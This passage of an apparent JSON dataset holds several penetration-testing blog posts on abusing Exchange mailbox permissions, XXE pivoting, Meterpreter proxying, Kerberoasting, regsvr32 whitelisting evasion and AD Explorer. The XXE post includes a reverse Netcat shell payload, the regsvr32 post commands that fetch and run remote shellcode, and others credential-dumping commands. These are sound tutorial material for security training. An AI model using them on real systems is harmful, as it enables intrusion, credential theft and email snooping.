-R\n\nNote that if you now attach to the newly created Screen session \u201cEMPIRE\u201d and exit out of the Powershell Empire instance, the Screen session is destroyed as the Empire instance is destroyed, leaving you back at your original shell.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Abusing Exchange Mailbox Permissions with MailSniper\"\nTaxonomies: \"Author, Beau Bullock, External/Internal, Red Team, email attack, MailSniper, Microsoft, Microsoft Exchange, MS, Office365, OWA, pen-testing, tools\"\nCreation Date: \"Fri, 21 Apr 2017 14:30:23 +0000\"\nBeau Bullock //\n\nOverview\n\nMicrosoft Exchange users have the power to grant other users various levels of access to their mailbox folders. For example, a user can grant other users access to read emails from their Inbox. If a user (or Exchange administrator) isn\u2019t careful and sets permissions incorrectly they might grant access to their mailbox to everyone at an organization. This creates a situation where any user at the organization can now read email from the mailbox with too broad permissions.\n\nUsing MailSniper, it is possible to quickly enumerate mailboxes like this that are accessible by any user. In this blog post, I\u2019ll be describing how this problem can occur, how to locate mailboxes with permission issues, and ultimately how to read email from these mailboxes without the need for the mailbox owner\u2019s credentials.\n\nSetting Mailbox Permissions with Outlook\n\nChanging permissions on a mailbox is a relatively easy thing for a user to accomplish on their own using the Microsoft Outlook client. If a user right clicks a folder such as the \u201cInbox\u201d, then clicks Properties...\", a folder properties menu will open.\n\nClicking on the \u201cPermissions\u201d tab one can see the current settings for the folder. This is where things get a bit interesting. By clicking the \u201cAdd\u2026\u201d button this allows a user to specify a certain account to grant various permissions to. This would be ideal because a user can limit access to specific people. However, you will notice there are \u201cDefault\u201d, and \u201cAnonymous\u201d items already included in Permissions. The \u201cDefault\u201d item essentially includes every user at an organization with access to email.\n\nIf a user mistakenly sets the permission level for the \u201cDefault\u201d item to anything other than \u201cNone\u201d (besides Contributor), they are potentially allowing every employee at an organization access to that mailbox folder.\n\nSetting permissions on mailbox folders can also be set by an Exchange administrator. Using the Set-MailboxFolderPermission cmdlet on the Exchange server directly, these mailbox permissions settings can be modified.\n\nInvoke-OpenInboxFinder\n\nAs a penetration tester, finding mailboxes that are essentially world-readable can be extremely valuable. They could allow for a number of interesting attack vectors. For one, we could search through another user\u2019s emails for certain things like passwords or sensitive data without having their credentials. Another attack vector could be that if the user\u2019s email address is tied to a password reset system an attacker could trigger the password reset, then access the user\u2019s email containing the password reset link.\n\nI\u2019ve added a function into MailSniper called Invoke-OpenInboxFinder to help find mailboxes with permissions set to allow other users access. To use it though we first need to gather a list of email addresses from the target environment. MailSniper has a module called Get-GlobalAddressList that can be used to retrieve the Global Address List from an Exchange server. It will try methods for both Outlook Web Access (OWA), and Exchange Web Services (EWS). This command can be used to gather an email list from Exchange:\n\nGet-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\\username -Password Spring2017 -OutFile global-address-list.txt\n\nIf you are on a system that can communicate with the target organization\u2019s internal Active Directory domain it is also possible to use Harmj0y\u2019s PowerView to gather an email list. Import the PowerView script into a PowerShell session and run this to get an email list:\n\nGet-NetUser | Sort-Object mail | ForEach-Object {$_.mail} | Out-File -Encoding ascii emaillist.txt\n\nAfter gathering an email list, the Invoke-OpenInboxFinder function can check each mailbox one at a time to determine if the current user has access. It also will check to see if there are any public folders in Exchange that could potentially be accessed as well.\n\nTo use Invoke-OpenInboxFinder import the MailSniper PowerShell script into a PowerShell session with:\n\nImport-Module MailSniper.ps1\n\nNext, run the Invoke-OpenInboxFinder function with:\n\nInvoke-OpenInboxFinder -EmailList .\\emaillist.txt\n\nInvoke-OpenInboxFinder will attempt to Autodiscover the mail server-based off of the first entry in the email address list. If this fails, you can manually set the Exchange server location with the -ExchHostname flag.\n\nIn the below example the command terminal is running as a domain user called \u2018jeclipse\u2019. After running Invoke-OpenInboxFinder against a list of email addresses from the domain two public folders were discovered. Also, the Inbox of \u201cmaximillian.veers@galacticempireinc.com\u201d is accessible to \u2018jeclipse\u2019. Invoke-OpenInboxFinder will print out the permission levels for each item. It can be seen in the output that the \u201cDefault\u201d item is set to \u201cReviewer\u201d.\n\nSearching Other User's Mailboxes with MailSniper\n\nAfter discovering that a mailbox has broad permissions that allows a user to access it, MailSniper could then be used to read and search through the messages in the target mailbox. The Invoke-SelfSearch function of MailSniper previously was purposed for primarily searching the mailbox of the user who was running it. I\u2019ve modified it slightly to allow for checking another user\u2019s email. A new flag called \u201cOtherUserMailbox\u201d needs to be specified to access other mailboxes. An example command would be the following:\n\nInvoke-SelfSearch -Mailbox target-email-address@domain.com -OtherUserMailbox\n\nIn the screenshot below I am using the \u201cjeclipse\u201d account to search maximillian.veers@galactiempireinc.com\u2019s mailbox. Three results were found where the subject or body of his emails contained the terms password, creds, or credentials.\n\nOffice365 and Externally Facing Exchange Servers\n\nInvoke-OpenInboxFinder also works across the Internet against Office365 and externally facing Exchange servers if Exchange Web Services (EWS) is accessible. Unless, Autodiscover is set up externally it is likely you will need to manually specify the target hostname with -ExchHostname. For connecting to Office365 the hostname would be \u201coutlook.office365.com\u201d. Specify the -Remote flag to have Invoke-OpenInboxFinder prompt for credentials that can be used to authenticate to the remote EWS service.\n\nAn example command for checking mailboxes hosted on Office365 for broad permissions would be the following:\n\nInvoke-OpenInboxFinder -EmailList .\\emaillist.txt -ExchHostname outlook.office365.com -Remote\n\nBelow is a screenshot from an actual real-world assessment where the customer utilized Office365. We had access to a single user\u2019s credentials at the organization. By running Invoke-OpenInboxFinder using an email list gathered from the Global Address List we were able to determine that three separate accounts at the organization allowed our user to read their email.\n\nRecommendations\n\nObviously, preventing an attacker from gaining access to a valid user account would be the first step in defending against this. The problem though is that it doesn\u2019t prevent your current employees from using this technique to see what other users\u2019 ur\u2019 mailboxes they have access to. Also note that it does appear that you must have a valid domain account that also has a mailbox in Exchange associated with it to check permissions on other uss\u2019 mailboxes.\n\nIf possible, restricting these types of changes from being made on the Outlook client would be helpful. I\u2019ve found a few older (2010) posts stating the permissions tab can be locked down with a GPO. I have not personally tried any of the solutions offered on these pages but it might be worth checking out. You can find those here , and here.\n\nUse the Invoke-OpenInboxFinder function in MailSniper, or the Get-MailboxFolderPermission cmdlet on Exchange to audit these settings for all accounts at an organization.\n\nConclusion\n\nMailbox permissions are something that should be looked at by both blue and red teams. With the way Outlook includes the \u201cDefault\u201d permission item in folder properties, it makes it far more likely that a user mistakenly grants everyone at an organization access to their mailbox. On the red team side this could provide an opportunity to find passwords or other sensitive data within emails that might further access on the network. Blue teams should worry about that but they also have other things to worry about. Some other things blue teams should worry about are high-profile accounts (C-Suite types) accidentally sharing their mailboxes out with the company, corporate employees snooping on other employees, or even the legalities of mailbox modification through these avenues.\n\n______\n\nYou can download MailSniper from Github here: https://github.com/dafthack/mailsniper\n\nSpecial thanks to \u2018doomguy\u2019 for opening an issue in the MailSniper repository on Github asking if this capability would be possible!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Web Server Screenshots with a Single Command\"\nTaxonomies: \"External/Internal, Red Team, Red Team Tools, EyeWitness, good to know, handy dandy, penetration testing, Pentesting, screenshots, tool\"\nCreation Date: \"Mon, 24 Apr 2017 14:23:13 +0000\"\nCarrie Roberts //\n\nEyeWitness is a handy tool developed by Chris Truncer for grabbing web browser screenshots from a list of URLs. Especially handy for pen-testers is its ability to create the list of target URLs from Nessus scan output files. Whenever I do a Nessus vulnerability scan against a client, I always run EyeWitness against the scan results. This is because Nessus reports all detected web servers as an informational finding and these can have vulnerabilities that are obvious to a human but hard for a scanner to detect. For example, one scan detected several web servers and listed the finding as informational. However, visiting each of these URLs in a web browser revealed streaming video of the client\u2019s internal offices. Clearly a security concern. Another common finding on internal network scans is embedded web servers that accept default credentials such as those found on routers, switches, printers and VOIP phones.\nThe tool can run on both Linux and Windows and I use it often. Although, occasionally I am in a situation where I am not able to use it. For example, when I have access to a Windows system only, and application whitelisting is in play or when moving files to the system is difficult. For such situations, I came up with the following Windows command line one-liner. Not as nifty as EyeWitness but having another quick an easy option comes in handy from time to time.\nFirst, I generate the list of URLs based on the Nessus scan results. One option for doing this is to export the CSV version of the scan results and do a quick formula in Excel to build the list of URLs based on the \"Service Detection\" scan result. The other method is to export the scan results as a .nessus file, move that to my own local Linux instance, and use EyeWitness with the createtargets option as shown below.\n./EyeWitness.py -f internal_scan_results.nessus --createtargets URLs.txt\nThen I move this list to the Windows environment I am working in and I can run the following command to open each of the URLs in the URLs.txt file using Internet Explorer.\nfor /F %u in (URLs.txt) do @start iexplore %u\nHowever, if I have more than a handful of URLs to work on, this will open up way too many Internet Explorer windows at once. To deal with this I added a counter and use it to pause after every five URLs opened. Before this will work, you need to first enable delayed variable expansion on the command line with this command.\ncmd.exe /V:ON\nOnce you have done this, you can proceed with the following command.\nset /a count=1 & for /F %u in (URLs.txt) do @start iexplore %u & echo %u & set /a _result=!count!%5>NUL & @(if !_result!==0 @pause) & set /a count+=1\nNote: If you run the command above and it doesn't pause after every five URLs, then you forgot to do the prerequisite \"cmd.exe /V:ON\" command.\nThis gives you a chance to manually inspect five web interfaces at a time, taking screenshots when it is interesting and trying default credentials. When you are ready to move on, just press any key in the command window to unleash another five. The command window output is shown below, the URL is echoed to the command line and opened in Internet Explorer in groups of five. Press any key when you are ready to continue.\n\nThis beats doing the same task manually by copy and pasting URLs into a browser window when using EyeWitness is not an option. Enjoy!\n\nWant to do something similar from Linux? Try this one-liner from @h1ghtopfade\n \nxargs -a URLs.txt firefox -new-tab \"$line\"\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"XML External Entity - Beyond /etc/passwd (For Fun & Profit)\"\nTaxonomies: \"External/Internal, Red Team, Red Team Tools, Gold Paper, Internal Pen Test, Pivot, Vulnerabilities, XML External Entity, XXE\"\nCreation Date: \"Thu, 27 Apr 2017 15:29:09 +0000\"\nRobert Schwass*//\n \n\nLast week I was asked twice in one day if I knew what XML External Entity (XXE) Vulnerabilities were. Maybe they are making a comeback in mainstream security buzz or sales jargon, I have no idea. (Often buzz-words propagated by the media or sales engineers become the driving factor for many of the conversations I have.)\n\nThere are great articles out there already that explain the details of XXE, if you need clarification on the vulnerability, check out the GIAC Gold Paper by Carrie Roberts here. Until recently, XXE was never something I wouldn't get excited about. Usually, I would just leverage the vulnerability to read files from the local system. Some bugs I drool for and hope to find, XXE was never one of them.\n\nSo I began looking into the latest XXE vulns on exploit-db, watching talks on YouTube, and reading papers\\blogs\\articles on XXE. The OWASP documentation is a good place to start https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing. The bit that caught my attention in the OWASP information is \u201can attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via http(s) requests or launching a CSRF attack to any unprotected internal services.\u201d \n\nNow We\u2019re Talking, Let\u2019s See What We Can Do!\n\nThe great thing about many of the XML parser implementations available today is that they allow for XXE exploitation by default.\n\nTake the following PHP script, it parses XML sent to it and echoes it back to the user. I named mine NEW_XXE.php and stuck it in the CUSTOM directory under my web root. This \u201capplication\u201d does absolutely nothing, but who cares, we want to mess with the parser itself.\n\nI install this PHP script on WEBSVR01.\n\nloadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n$xml = simplexml_import_dom($dom);\n$stuff = $xml->stuff;\n\n$str = \"$stuff \\n\";\n\necho $str;\n?>\n\nYou can throw the above script into your PHP server (make sure you install php-xml), if you want to create this scenario in a lab. \n\nNow create an xml file to send as a request to the server with the following content. I named mine \u201csend.txt\u201d and send it from WEBSVR01 to localhost, to make sure everything works as expected locally.\n\n        This is my stuff\n\nPut whatever you want in stuff and send it to WEBSVR01 aka localhost like so.\n\nSee the echoed response.\n\nSo the \u201capplication\u201d is up and running. Good. Now we can mess with the parser.\n\nLet\u2019s call some External Entities\n\nModify \u201csend.txt\u201d to be the following.\n\nThis is a typical XXE attack against a Linux System and is a good way to prove the vulnerability exists. If everything is working correctly you should get a dump of \u201c/etc/passwd\u201d\n\nFrom WEBSVR01 send it again to localhost.\n\nAnother very useful thing you can do with XXE is create HTTP requests.\n\nStart the python SimpleHTTPServer on port 8888 on WEBSVR01 and let\u2019s see what happens.\n\nAnd on my python http server.\n\nCool we can send http requests.\n\nFrom a remote system I can exploit this vulnerability and get some of the network information. First let me paint the picture, you find this vulnerability on a web server on the internet and you want to use it as a pivot point.\n\nThe diagram below lays it all out. I get a web server on 34.200.157.128, that host is really WEBSVR01 behind the NAT/Firewall device. WEBSVR01 has an XXE vulnerability that I want to use to gather information and potentially exploit WEBSRV02. I\u2019m sitting on the open internet, on my Attack PC.\n\nYou know it's an Ubuntu server because you did a proper enumeration. There are a few places you want to look to get the networking information of this server.\n\nFirst you want to grab \u201c/etc/networking/interfaces\u201d, and if you need more information look in \u201c/proc/net/route\u201d (These values are hex and you may need to convert them if it comes to that).\n\nLet me walk you through it. From my Attack PC (Ubuntu 14 LTS), I create the request file to grab \u201c/etc/network/interfaces\u201d from the vulnerable web server.\n\nOn ATTACK PC Edit the file to grab /etc/passwd:\n\nMake the request:\n\nGreat! We now know the IP Scheme of the Internal network or DMZ this host is sitting on.\n\nLet's grab the default page of this server via XXE using its internal IP address 10.0.0.3\n\nNOTE! Some characters will break the XML. So far we have only looked at files or made simple http requests that did not return characters that would break our XML. Since we are using PHP we can base64 encode what is returned. On the ATTACK PC Change your \u201csend.txt\u201d to match the following, adding the following PHP filter.\n\nNow Send The Request\n\nWe get a bit of base64 back. Once decoded we have the page contents.\n\nBuilding an HTTP Scanner!\n\nPutting this all together, I can now scan the internal IP range for web servers .\n\nOf course some Python.\n\nYou can get the script on my GitHub here.\n\nFrom the ATTACK PC, EXECUTE!\n\nLet's see what the Base64 Decodes as for the data returned from 10.0.0.4\n\nHmmm\u2026. CoreHTTP?\n\nNice little exploit on exploit-db.comhttps://www.exploit-db.com/exploits/10610/\n\nSince we are getting an index.pl (Perl) file, I'm going to assume CGI is enabled, so this exploit could work. And it works by passing the parameters in a GET request, so we can exploit it through the XXE vulnerability on the external facing host.\n\nAfter decrypting the Metasploit Module, the request that needs to be sent looks like this URL encoded http request:\n\nhttp://10.0.0.4/index.pl?%60mknod%20backpipe%20p%20%26%26%20nc%2034.200.157.80%201337%200%3Cbackpipe%20%7C%20%2Fbin%2Fbash%201%3Ebackpipe%26%60\n\nNotice I put my IP address in there \u201c34.200.157.80\u201d and the port my Netcat listener will be on. The entire string is an URL encoded reverse Netcat shell without the \u201c-e\u201d support utilizing mknod and a backpipe.\n\nSo let\u2019s trigger the exploit on 10.0.0.4 via the XXE Vulnerability.\n\nOn the ATTACK PC Create a Netcat listener and Execute!\n\nLooks like a Reverse Shell!\n\nSo there you have it. A small tutorial on taking an XML External Entity vulnerability from an external host, and using it to exploit a vulnerability on an internal host. I want to thank BHIS and special thanks to Carrie Roberts for the excellent Gold Paper.\n\n_______\n\n*Robert is a guest poster on our blog. Interested in guest posting? Contact us here.\n\nJoin the BHIS Blog Mailing List \u2013 get notified when we post new blogs, webcasts, and podcasts.\ufeff\n\n[jetpack_subscription_form show_only_email_and_button=\"true\" custom_background_button_color=\"undefined\" custom_text_button_color=\"undefined\" submit_button_text=\"Subscribe\" submit_button_classes=\"undefined\" show_subscribers_total=\"true\" ]\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Use Nmap with Meterpreter\"\nTaxonomies: \"Author, Brian Fehrman, External/Internal, Red Team, All the Shellz, Debian, metasploit, meterpreter, Nmap, Pentesting, proxychains, Ubuntu\"\nCreation Date: \"Mon, 01 May 2017 15:41:35 +0000\"\nBrian Fehrman //\n\nYou\u2019ve sent your phishing ruse, the target has run the Meterpreter payload, and you have shell on their system. Now what? If you follow our blogs, you probably have quite a few ideas! One thing that I don\u2019t typically do is port scan other systems on the network. There are a few reasons for this. Port scanning is quite noisy, many IDS packages are set to quickly alert on these activities, and most of the time it isn\u2019t needed to achieve my goals. Regardless, let\u2019s say that you do find yourself in a situation where you do need to find services on other systems. Maybe you\u2019re on a segmented network, you\u2019ve gained shell on a jump host, and now you want to explore the new world that has just opened up to you. There are a few options out there that you can utilize.\n\nMetasploit has a few built-in scanner modules that you can use after you\u2019ve achieved a Meterpreter session on a system. You just add a route in Metasploit to tunnel traffic through your session, provide the scanning module with the addresses that you\u2019d like to scan, kick off the scanner, and then wait for the results. In my experience, I\u2019ve had varying mileage when using this. Sometimes the feedback can be a bit lacking and the results aren\u2019t always consistent. This could very well just be user error. Even with that in mind, I prefer to have a bit more flexibility than what the modules provide.\n\nWouldn't it be great if we could use something like Nmap to do our scanning? Well, guess what? We can! We'll utilize a combination of tools and features to get this quickly up and running [1]. The first step is to get a Meterpreter session on a system.\n\nOnce you\u2019ve done that, add a route to tunnel traffic that is destined for your target subnet through your session.\n\nNext, hop into the auxiliary/server/socks4a Metasploit module, set your srvport to 1090, and run the module. You could choose a different port, this is just the one that I chose to use. This will set up a SOCKS proxy-listener on your local system. The SOCKS proxy will be aware of the routes that you\u2019ve added in Metasploit. Any traffic going through this proxy that has a destination address that is within the subnet route(s) that you\u2019ve added will automatically be routed through the corresponding Meterpreter session.\n\nOpen another terminal on the same machine that you\u2019re using to run Metasploit and install the proxychains package if you don\u2019t already have it. For instance, on Ubuntu or Debian:\n\napt-get install proxychains\n\nNow, use your favorite editor to open up the /etc/proxychains.conf file. Head to the bottom of the file and edit the last line to look like the image below.\n\nHead back to your terminal and you\u2019re ready to start scanning! I\u2019ve found that the Syn scan and Ping Discovery options in Nmap don\u2019t seem to work the best via proxychains. I suggest running Nmap with the -sT and -Pn options when using the proxychains method. The image below shows how to kick off a scan against a subnet on the target network that checks for some commonly-used ports, outputs the status to the screen, and saves the results in multiple formats that can easily be parsed later.\n\n[1] https://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot\n\nFollow Brian on Twitter @fullmetalcache\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Toast to Kerberoast\"\nTaxonomies: \"Author, Derek Banks, External/Internal, Red Team, kerberoasting, Kerberos\"\nCreation Date: \"Mon, 08 May 2017 16:55:33 +0000\"\nDerek Banks // \n\nThis post will walk through a technique to remotely run a Kerberoast attack over an established Meterpreter session to an Internet-based Ubuntu 16.04 C2 server and crack the ticket offline using Hashcat.\n\nRecently I have had a lot of success with privilege escalation in an Active Directory domain environment using an attack called Kerberoasting.  Tim Medin presented this technique at SANS Hackfest 2014 and since then there have been numerous awesome articles and conference talks on the details of the attack and tools written for different techniques to pull it off (reference links at the bottom of the post).\n\nThe Microsoft implementation of Kerberos can be a bit complicated, but the gist of the attack is that it takes advantage of legacy Active Directory support for older Windows clients and the type of encryption used and the key material used to encrypt and sign Kerberos tickets. Essentially, when a domain account is configured to run a service in the environment, such as MS SQL, a Service Principal Name (SPN) is used in the domain to associate the service with a login account. When a user wishes to use the specific resource they receive a Kerberos ticket signed with NTLM hash of the account that is running the service.\n\nThis is a bit of an oversimplification of the details of the process for sure, but the end result is that any valid domain user can request an SPN for a registered service (mostly I have seen SQL and IIS) and the Kerberos ticket received can be taken offline and cracked.  This is significant because generally a service account is at the very least going to be an administrator on the server where it runs.\n\nSo how do we pull this off?  Assuming that Metasploit is installed on the C2 server already, we need to get the Impacket project from Core Impact.  This is a collection of Python classes for working with network protocols.  If Metasploit is not installed, the PTF framework from TrustedSec makes it easy on Ubuntu 16.04.\n\n#git clone https://github.com/CoreSecurity/impacket\n\nNext, we need to install and configure proxychains.  After install, the only configuration change is the desired port (for example, 8080).\n\n#apt-get install proxychains\n\nNow we need an established meterpeter session.  There are many ways to go about this in a pen test and different methods can be situationally dependent so we will assume an established session is active.\n\nNext, we set a route in Metasploit to cover the internal subnet that contains the IP address of a Domain Controller.\n\nWe now need a method to route externally to Metasploit tools through the meterpreter connection.  For this, Metasploit has a module named socks4a that uses the built-in routing to relay connections.  Set the SRVPORT option to the same port value used with configuring proxychains.\n\nI am a generally a paranoid person, and since the socks proxy port is now an open socket that routes through to an internal network, I suggest using IP tables to limit connections to 8080 to the localhost.  Some proponents of hacking naked may think this is overkill, but sometimes I think wearing around a firewall is appropriate - this is one of those times.  The IP tables rules file I use is here.\n\nPlace the IP tables rules file in /etc/iptables.rules and run:\n\n#/sbin/iptables-restore < /etc/iptables.rules\n\nNow we are all set to use one of the Impacket example scripts and a valid and unprivileged domain account to gather Kerberos tickets advertised via SPN using proxychains over the meterpreter session.\n\n#proxychains GetUserSPNs.py -request -dc-ip 192.168.2.160 lab.local/zuul\n\nAny Kerberos tickets gathered by the GetUserSPNs script directly crackable with Hashcat without any additional conversion (the hash type was added in version 3.0).  On my Windows desktop with a single Radeon R280, the password for the service account was cracked in three minutes using the Crackstation word list.\n\nhashcat -m 13100 -a 0 sqladmin_kerberos.txt crackstation.txt\n\nTo take it one step further, the same method of proxying tools over meterpreter can be used to dump out domain account hashes from the domain controller using another example Impacket script named secretsdump.py once domain administrator rights have been obtained.\n\nIn this example in my lab, I had the SQL admin service account with a weak password also a member of the Domain Admins group.  You may think this is a bit contrived, but it is not.  In the last few months, especially in older Active Directory environments that have grown organically over the years, I have directly obtained a domain administrator account using Kerberoasting and cracking a Domain Admins group member password.  I have subsequently elevated to domain administrator from further pivoting on numerous occasions.\n\n#proxychains secretsdump.py -just-dc-ntlm LAB/sqladmin@192.168.2.160\n\nThe fix for this at the moment is to make sure that all service accounts in your environment have really long passwords.  How long depends on what resources you think your potential attacker has access to for cracking passwords. My current suggestion (based on potential password cracking tool limitations) is 28 characters or longer with a 6-month rotation.\n\nThank you to everyone who has put a lot of time, research, and effort into attacking Kerberos.  As always, I stand on the shoulders of giants.  If I left any references out, it was not on purpose, please let us know if any other relevant links should be included:\n\nhttps://adsecurity.org/?p=2293\n\nhttps://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf\n\nhttps://room362.com/post/2016/kerberoast-pt1/\n\nhttp://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz\n\nhttps://github.com/nidem/kerberoast\n\nhttps://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Evade Application Whitelisting Using REGSVR32\"\nTaxonomies: \"Author, External/Internal, Joff Thyer, Red Team, Red Team Tools, Casey Smith, COM+ scriplets, DLL, subtee, Wevade, whitelisting\"\nCreation Date: \"Wed, 10 May 2017 14:11:03 +0000\"\nJoff Thyer // \n\nI was recently working on a Red Team for a customer that was very much up to date with their defenses. This customer had tight egress controls, perimeter proxying, strong instrumentation, and very tight application whitelisting controls. My teammate and I knew that we would have to work very hard to get command and control outbound from this environment, and that would be after obtaining physical access (yet another significant challenge).\n\nThe week before going on-site, we began to research all of the various methods for potential application whitelisting bypass. We assumed the best case defensive scenario whereby the customer would have all binary execution blocked with the exception of specific applications permitted. In prior tests with other customers and this same customer, we had used \u201crundll32.exe\u201d to execute DLL content. This method is really useful if you can host shellcode within a DLL, and have a nice controlled entry point. In the Metasploit case, the DLL entry point is named \u201cControl_RunDLL\u201d. While this might evade whitelisting, we also knew this old trick had been played before and we likely could not count on it again.\n\nOne interesting technique published by Casey Smith involves the DLL registration process within Windows, and shows how COM+ scriptlets can be executed by reading the scriptlet as an argument to \u201cregsvr32.exe\u201d, and using the COM+ \u201cscrobj.dll\u201d. \n\nAdditionally, Casey published an outline of how to launch processes using a custom DLL written in C# as further detailed in this source code.\n\nI was enamored by both these techniques although I didn\u2019t want to write COM+ scriptlets to launch payloads, but rather wanted greater flexibility. My goals were to try and get \u201cregsvr32.exe\u201d to register a DLL which could execute either shellcode or a PowerShell script pipeline directly during the DLL registration process.\n\nWhat is very nice about the \u201cregsvr32.exe\u201d DLL registration method is that whatever DLL you create only has to export four different methods in order to work. These are:\n\nEntryPoint()\n\nDllRegisterServer()\n\nDllUnRegisterServer()\n\nDllInstall()\n\nAs Casey points out in various blog entries, this affords you with multiple paths of code execution, all using a Windows binary that is likely to be whitelisted in any environment.\n\nWait, but what is this \u201cregsvr32.exe\u201d entity? According to Microsoft \u201cThis command-line tool registers .dll files as command components in the registry.\u201d. You can read more from TechNet here: https://technet.microsoft.com/en-us/library/bb490985.aspx\n\nI decided to leverage the \u201cDllInstall()\u201d routine with the following logic:\n\nPass the string \u201cshellcode\u201d or \u201cpowershell\u201d using the \u201c/i\u201d flag when running \u201cregsvr32.exe\u201d.\n\nPass in a comma followed by either a filename or URL pointing to data that is base64 encoded. The base64 encoded data is either binary shellcode or a PowerShell script.\n\nRead the file or URL contents, then base64 decode.\n\nIf the content is PowerShell, create a runspace pipeline, and execute the script.\n\nIf the content is Shellcode, allocate memory and execute the shellcode.\n\nA code snippet to perform these functions appears below as written in C#. The idea is to compile this into a DLL which then can be used with \u201cregsvr32.exe\u201d.\n\n Copying ShellCode into Memory and Creating New Thread \n\n Creation of a System Automation Runspace for PowerShell Script Execution \n\nNow, you ask, how do you pass the filename, or URL into the DLL when using \u201cregsvr32.exe\u201d. It turns out that the \u201c/i\u201d flag allows us to specify parameters on the command line which we can then parse to get the information we need. Once we parse this information, we can then use the NET WebClient() methods to either download or just read from the file the content we are interested in.\n\n DllInstall() Method Exported \n\n Filename and URL Parsing and Decision Logic \n\nPutting it all together, we can then compile both a 64-bit, and 32-bit version of our DLL and then use the DLL to deliver either PowerShell or Shellcode payloads. If our compiled DLL\u2019s are called \u201crs32.dll\u201d, and \u201crs64.dll\u201d, this is how you might use the end tool.\n\n1) On Linux system, generate your payload:\n\n$ msfvenom -p windows/x64/exec CMD=calc.exe -f raw 2>/dev/null | base64 >calc.b64\n\n2) Download the payload to Windows, as well as the \u201crs64.dll\u201d (assuming 64-bit).\n\nC:\\> regsvr32.exe /s /i:shellcode,calc.b64 rs64.dll\n\nBut WAIT, it gets even better now. Why bother downloading the payload when you can just use HTTP(s) from the fancy DLL directly.\n\nC:\\> regsvr32.exe /s /i:shellcode,http://10.10.10.10/calc.b64 rs64.dll\n\nNow we can do the same thing, only this time using PowerShell instead. Generate your favorite PowerShell base64 encoded payload. Let me guess, you probably want to use PowerShell Empire (https://www.powershellempire.com/) which conveniently includes a base64 script as the client-side agent!\n\n1) Generate your PowerShell empire script using the \u201clauncher\u201d stager\n\n2) Now cut/paste only the base64 encoded portion and save it in a file. \n\n3) Execute the powershell using \u201cregsvr32.exe\u201d and your fancy custom DLL.\n\nC:\\> regsvr32.exe /s /i:powershell,payload.b64 rs64.dll\n\nOr, alternatively:\n\nC:\\> regsvr32.exe /s /i:powershell,http://10.10.10.10/payload.b64 rs64.dll\n\nAnd there you have it, a brand new method of payload delivery that will happily bypass most environments that have implemented application whitelisting. If you want to try out the code, please visit the bitbucket repo:\n\nhttps://bitbucket.org/jsthyer/wevade\n\nThe \u201cwevade\u201d name is a random brain pick combination of \u201cwhitelisting\u201d, and \u201cevade\u201d. Yeah, I know\u2026 I don\u2019t claim to be a marketing guru by any stretch. Thanks, and please enjoy!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Domain Goodness - How I Learned to LOVE AD Explorer\"\nTaxonomies: \"Author, External/Internal, Red Team, Red Team Tools, Sally Vandeven, AD Explorer, DA, domain admin, Pentesting, Shodan\"\nCreation Date: \"Mon, 15 May 2017 16:18:57 +0000\"\nSally Vandeven // \n\n OR How to Pentest with AD Explorer! \n\nMark Russinovich\u2019s Sysinternals tools (Microsoft) are nothing new. They have been a favorite among system administrators for many, many years. Maybe a little less known is that they are super helpful for pentesters too! One of my favorites is AD Explorer. My colleague Dave Fletcher, who has worn many hats including that of sysadmin extraordinaire, reminded me of this tool on an engagement and I have been using it on internal assessments faithfully ever since. Of course for organizations that expose domain controllers on the Internet this could be useful on external tests as well (read on for more about that using Shodan).\n\nAll you need is a domain account - any domain account - and you can talk to a domain controller and ask it to enumerate the domain for you. It will layout the OU structure, the user accounts, computer accounts. It may offer some help on finding juicy targets like privileged users and database servers.  \n\nLike all the Sysinternals tools, they are standalone executables, no installation required. So as long as you have write access somewhere you can download it from http://live.sysinternals.com.\n\nBut what if you don\u2019t have write access or are not allowed to download executables? No worries, you can also give it the following UNC path directly from the Run box or an Explorer window and execute it without downloading the file to disk.\n\n\\\\live.sysinternals.com\\tools\\ADExplorer.exe\n\nClick on an executable to load it directly into memory from Microsoft\u2019s site\n\nLet\u2019s look at a couple of examples of how awesome this tool is. First, you might find metadata giving you clues about an object like in the screenshot below. It looks like we found the CIO\u2019s laptop. I don\u2019t know about you but if I learn the machine name of the CIO\u2019s computer I can\u2019t resist finding a way to login there and grab their credentials from memory. That would typically be a pretty privileged account as well.\n\nThere may be other attributes with interesting information as well, such as the \u201cinfo\u201d attribute. In the example below, we show an AD record from a real test. The data is redacted but suffice it to say the data there is quite sensitive and presents some excellent social engineering opportunities (think password reset)!\n\nIf you need to find high-value target servers then more often than not the organization\u2019s naming convention will help you with that. Servers are very frequently named according to their function, eg. with \u201cSQL\u201d or \u201cSharepoint\u201d in the name.\n\nThe search feature in AD Explorer is also excellent and helps you slice and dice through the mountains of data to find just what you need. For example, do you need to identify the disabled accounts? Just select the userAccountControl attribute and search for values of 514. (Actually, the userAccountControl attribute is a value representing multiple flags, one of which is the \u201cdisabled\u201d flag so there could be multiple values here that represent disabled accounts but the most common would be 514.)\n\nIf you have high enough privileges you can also add and modify objects and attributes. It doesn\u2019t let you do as much as Active Directory Users and Computers but this feature still could be useful on a pentest. As a demo, I added the \u201cComment\u201d attribute for user Grace in my test domain.\n\nThe tool also gives you the wonderful option of saving a snapshot...\n\n...that you can copy off anywhere and open it back up in AD Explorer for your viewing pleasure.\n\nViewing a snapshot won\u2019t let you make any changes but it is excellent for reconnaissance activities.  \n\nAD Explorer can also do a \u201cdiff\u201d of two snapshots.  How might this be useful on a pentest? Take a snapshot right away when you get access to the domain. Then after you have done some hacking and cracking and people start changing their passwords or disabling accounts you can take another snapshot and see who has changed their passwords or which are disabled. As far as I can tell, AD Explorer does not allow you to modify passwords or 